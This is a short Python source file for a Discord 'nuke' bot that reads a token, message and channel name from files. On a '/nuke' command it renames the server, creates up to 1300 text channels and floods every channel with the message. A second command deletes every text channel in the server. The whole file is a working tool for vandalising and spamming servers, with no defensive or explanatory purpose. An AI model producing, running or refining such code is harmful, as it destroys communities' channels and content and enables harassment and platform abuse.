import discord, asyncio

FILES = ["TOKEN", "MESSAGE", "SERVER_CHANNEL_NAME"]
contents = []
for file in FILES:
    with open(file, encoding="utf-8") as f:
        contents.append(f.read())
TOKEN, MESSAGE, SERVER_CHANNEL_NAME = contents

intents = discord.Intents.all()
client = discord.Client(intents=intents)

async def allChannelDeleteAndCreate(message):
    try:
        guild = message.guild
        await asyncio.gather(*(channel.delete() for channel in guild.text_channels))
        await guild.create_text_channel(SERVER_CHANNEL_NAME)
    except:
        pass

async def nuke(message):
    try:
        guild = message.guild
        channels = guild.text_channels
        await guild.edit(name=SERVER_CHANNEL_NAME)
        for i in range(1300):
            channel = await guild.create_text_channel(SERVER_CHANNEL_NAME)
            channels.append(channel)
            await asyncio.gather(*(channel.send(MESSAGE) for channel in channels))
    except Exception as e:
        print(e)

@client.event
async def on_ready():
    print("/nuke")

@client.event
async def on_message(message):
    if message.author.bot:
        return
    if message.content == '/nuke':
        await nuke(message)
    elif message.content == '/allChannelDeleteAndCreate':
        await allChannelDeleteAndCreate(message)

def main():
    client.run(TOKEN)

if __name__ == "__main__":
    main()